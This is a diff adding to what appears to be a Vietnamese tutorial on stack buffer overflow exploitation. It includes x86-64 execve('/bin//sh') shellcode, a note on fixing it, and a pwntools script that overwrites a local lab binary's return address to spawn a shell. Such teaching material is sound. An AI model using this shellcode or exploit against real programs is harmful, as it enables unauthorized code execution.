@@ -90,3 +90,27 @@ Với đoạn code assembly này, ta có shellcode là:
 ```
 \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
 ```
+
+Tuy nhiên, khi sử dụng shellcode này thì mình exploit không thành công nên mình thử bỏ câu lệnh `xor %rax,%rax` thì ta có shellcode là:
+```
+\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
+```
+
+Lúc này thì mình exploit thành công. Script exploit:
+```python
+from pwn import *
+
+p = process('./demo')
+
+shellcode = b'\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05'
+p.recvuntil('DEBUG: ')
+buffer_addr = int(p.recv().strip()[2:], 16)
+
+payload = shellcode + b'A' * (40 - len(shellcode)) + p64(buffer_addr)
+
+with open('payload.in', 'wb') as f:
+    f.write(payload)
+
+p.sendline(payload)
+p.interactive()
+```
